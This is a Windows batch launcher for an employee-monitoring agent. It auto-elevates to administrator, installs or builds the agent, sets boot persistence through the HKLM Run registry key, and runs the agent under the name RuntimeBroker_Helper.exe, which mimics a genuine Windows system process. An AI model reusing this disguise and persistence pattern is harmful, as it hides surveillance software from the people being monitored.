@echo off
REM Windows Employee Monitor Launcher
REM This script auto-elevates to admin and runs in PowerShell

REM Check if running as admin
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrator privileges...
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

cd /d "%~dp0"

echo ==========================================
echo    Windows Employee Monitor Launcher
echo          (Running as Administrator)
echo ==========================================
echo.
echo 1. Install (First Time Setup)
echo 2. Uninstall
echo 3. Check Status
echo 4. Run Agent Manually
echo 5. View Logs
echo 6. Exit
echo.
set /p choice="Select option (1-6): "

if "%choice%"=="1" goto install
if "%choice%"=="2" goto uninstall
if "%choice%"=="3" goto status
if "%choice%"=="4" goto run
if "%choice%"=="5" goto logs
if "%choice%"=="6" goto end
echo Invalid option
goto end

:install
echo.
echo Running installer...
echo.
if exist "EmployeeMonitor.exe" (
    EmployeeMonitor.exe --install
) else if exist "bin\Release\net8.0-windows\win-x64\publish\EmployeeMonitor.exe" (
    bin\Release\net8.0-windows\win-x64\publish\EmployeeMonitor.exe --install
) else (
    echo EmployeeMonitor.exe not found!
    echo.
    echo Building the project first...
    dotnet publish -c Release -r win-x64 --self-contained -o publish
    if exist "publish\EmployeeMonitor.exe" (
        publish\EmployeeMonitor.exe --install
    ) else (
        echo Build failed. Please build manually:
        echo   dotnet publish -c Release -r win-x64 --self-contained
    )
)
goto end

:uninstall
echo.
echo Running uninstaller...
if exist "EmployeeMonitor.exe" (
    EmployeeMonitor.exe --uninstall
) else if exist "bin\Release\net8.0-windows\win-x64\publish\EmployeeMonitor.exe" (
    bin\Release\net8.0-windows\win-x64\publish\EmployeeMonitor.exe --uninstall
) else (
    echo Removing from startup registry...
    reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "RuntimeBroker_Helper" /f 2>nul
    echo Killing process...
    taskkill /F /IM RuntimeBroker_Helper.exe 2>nul
    echo Removing install folder...
    rmdir /s /q "C:\ProgramData\EmployeeMonitor" 2>nul
    echo Uninstall complete.
)
goto end

:status
echo.
echo Checking agent status...
echo.
tasklist /FI "IMAGENAME eq RuntimeBroker_Helper.exe" 2>NUL | find /I "RuntimeBroker_Helper.exe" >NUL
if "%ERRORLEVEL%"=="0" (
    echo [RUNNING] Agent is currently running
) else (
    echo [STOPPED] Agent is NOT running
)
echo.
echo Config location: C:\ProgramData\EmployeeMonitor\config.json
if exist "C:\ProgramData\EmployeeMonitor\config.json" (
    echo [OK] Config file exists
    echo.
    echo Config contents:
    type "C:\ProgramData\EmployeeMonitor\config.json"
) else (
    echo [NOT FOUND] No config file found (agent not installed)
)
echo.
echo Startup Registry:
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "RuntimeBroker_Helper" 2>nul
if "%ERRORLEVEL%"=="0" (
    echo [OK] Agent is registered to start on boot
) else (
    echo [NOT SET] Agent is NOT registered to start on boot
)
goto end

:run
echo.
echo Starting agent manually...
if exist "C:\ProgramData\EmployeeMonitor\RuntimeBroker_Helper.exe" (
    start "" "C:\ProgramData\EmployeeMonitor\RuntimeBroker_Helper.exe"
    echo Agent started.
) else if exist "EmployeeMonitor.exe" (
    start "" "EmployeeMonitor.exe"
    echo Agent started from current directory.
) else (
    echo Agent executable not found. Please install first.
)
goto end

:logs
echo.
echo Viewing logs (if available)...
if exist "C:\ProgramData\EmployeeMonitor\logs" (
    dir "C:\ProgramData\EmployeeMonitor\logs"
) else (
    echo No logs folder found.
)
goto end

:end
echo.
pause
